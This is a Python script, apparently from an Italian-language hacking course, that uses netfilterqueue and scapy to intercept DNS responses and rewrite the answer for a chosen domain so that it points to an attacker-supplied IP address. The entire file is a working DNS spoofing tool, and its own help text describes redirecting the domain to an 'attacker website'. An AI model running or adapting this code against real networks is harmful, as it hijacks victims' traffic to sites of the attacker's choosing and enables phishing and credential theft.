#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import argparse

# Modifica dei campi dns lez 67-68
parser = argparse.ArgumentParser()
parser.add_argument('-site', action = "store", type = str, dest = "site", help = "domain that will be redirect to attacker website", required = True)
parser.add_argument('-spoofedIP', action = 'store', type = str, dest = "spoofed", help = "IP address of attacker domain", required = True)
args = vars(parser.parse_args())
site = format(args["site"])
spoofed = format(args["spoofed"])


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR): # DNS Resource Record
        print("[+] Spoofing target") 
        qname = scapy_packet[scapy.DNSQR].qname
        if site in qname:
            answer = scapy.DNSRR(rrname=qname, rdata = spoofed)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            # Se cancello i campi del pacchetto scapy li ricalcola prima id inviarlo
            packet.set_payload(str(scapy_packet))
    # print(scapy_packet.show())

    packet.accept()
    #packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

